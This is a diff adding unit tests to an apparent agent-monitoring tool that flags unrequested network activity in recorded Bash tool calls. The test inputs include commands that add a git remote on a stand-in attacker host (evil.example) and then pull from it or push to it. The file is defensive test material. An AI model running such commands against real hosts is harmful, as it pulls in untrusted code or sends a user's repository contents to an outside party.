@@ -498,6 +498,50 @@ class TestStrict(unittest.TestCase):
         self.assertEqual([(fl["program"], "variable" in fl["evidence"]) for fl in net], [("curl", True)])
         self.assertIn("1 unasked", net[0]["evidence"])
 
+    def strict(self, calls, session="s1"):
+        f = af.Fleet()
+        f.suppressions = {}
+        for cmd in calls:
+            sess = session
+            if isinstance(cmd, tuple):
+                cmd, sess = cmd
+            f.add_tool("p", "Bash", {"command": cmd}, TS, "auto", session=sess, agent="claude")
+        af.apply_network_policy(f, [], strict=True)
+        return f, [fl for fl in f.flags if fl["categories"] == ["network-unasked"]]
+
+    def test_remote_added_then_pulled_is_judged_by_its_host(self):
+        f, net = self.strict(["git remote add x https://evil.example/r && git pull x"])
+        pull = [i for i in f.network_items if i["host"] == "evil.example" and i["url"] != "https://evil.example/r"]
+        self.assertEqual(len(net), 1)
+        self.assertIn("evil.example", net[0]["evidence"])
+        self.assertTrue(any(i["host_inferred"] and i["host"] == "evil.example" for i in f.network_items))
+        # across two commands, and for set-url
+        f, net = self.strict(["git remote add x https://a.example/r", "git remote set-url x https://b.example/r",
+                              "git fetch x"])
+        self.assertEqual([i["host"] for i in f.network_items], ["b.example"])
+        self.assertEqual(len(net), 1)
+
+    def test_unknown_remote_names_stay_exempt(self):
+        f, net = self.strict(["git pull origin", "git fetch upstream", "git pull"])
+        self.assertEqual((len(f.network_items), net), (3, []))
+
+    def test_clone_makes_origin_in_that_session(self):
+        f, net = self.strict(["git clone https://github.com/o/r", "git pull"])
+        self.assertEqual([i["host"] for i in f.network_items], ["github.com", "github.com"])
+        self.assertTrue(f.network_items[1]["host_inferred"])
+        self.assertEqual(len(net), 1)                    # one (git, github.com) group
+
+    def test_remotes_never_cross_sessions(self):
+        f, net = self.strict([("git remote add x https://evil.example/r", "s1"), ("git pull x", "s2")])
+        self.assertEqual(net, [])                        # s2's pull x resolves to nothing
+        self.assertEqual([i["host"] for i in f.network_items], [None])
+        f2, net2 = self.strict(["git clone https://github.com/o/r", "git pull"], session=None)
+        self.assertEqual([i["host"] for i in f2.network_items], ["github.com", None])
+
+    def test_dry_run_push_resolves_too(self):
+        f, net = self.strict(["git remote add x https://evil.example/r && git push --dry-run x"])
+        self.assertEqual(len(net), 1)
+
     def test_cli_rejects_bad_trust(self):
         with self.assertRaises(SystemExit) as cm, redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
             af.main(["--network-trust", "https://x.io", "--json"])
